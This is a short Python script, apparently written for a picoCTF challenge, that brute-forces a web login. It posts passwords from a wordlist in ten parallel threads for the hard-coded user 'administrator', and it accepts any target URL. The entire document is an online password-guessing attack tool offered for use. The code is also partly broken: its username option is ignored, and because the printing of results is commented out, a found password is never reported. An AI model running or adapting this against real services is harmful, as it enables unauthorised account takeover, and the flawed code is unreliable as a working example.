import requests
import concurrent.futures
import argparse

url = 'http://mercury.picoctf.net:25395/'

def check_password(password):
    try:
        data = {'user': 'administrator', 'pass': password}
        r = requests.post(url=url, data=data, timeout=10)
        r.raise_for_status()
        print(f"\r[+] checking for {password}",end="")
        if "incorrect" in r.text:
            return f"Failed: {password}"
        else:
            return f"Found: {password}\n{r.text}"
    except requests.exceptions.RequestException as e:
        return f"Error: {password} - {e}"

if __name__ == '__main__':

    parser = argparse.ArgumentParser(description="This is a bruteforcing tool for CTFs")

    parser.add_argument('-w', '--wordlist', help='Path to a wordlist file')
    parser.add_argument('-u', '--url', help='URL to bruteforce')
    parser.add_argument('-U', '--username', help='Username to use for authentication')
    args = parser.parse_args()

    if args.wordlist:
        url = args.url

        print(f"[+] Target url : {url}")
        print(f"[+] wordlist : {args.wordlist}\n")
        encodings = ['utf-8', 'latin-1', 'cp1252']
        passwords = None

        for encoding in encodings:
            try:
                with open(args.wordlist, 'r', encoding=encoding) as file:
                    passwords = [line.strip() for line in file]
                break  # Break the loop if the file is successfully opened
            except UnicodeDecodeError:
                continue  # Try the next encoding
        
        max_concurrent_requests = 10

        # Use concurrent.futures to parallelize requests with threads
        with concurrent.futures.ThreadPoolExecutor(max_concurrent_requests) as executor:
            results = list(executor.map(check_password, passwords))

        # for result in results:
        #     print(result)

    else:
        print("Provide a valid wordlist and URL")
        exit()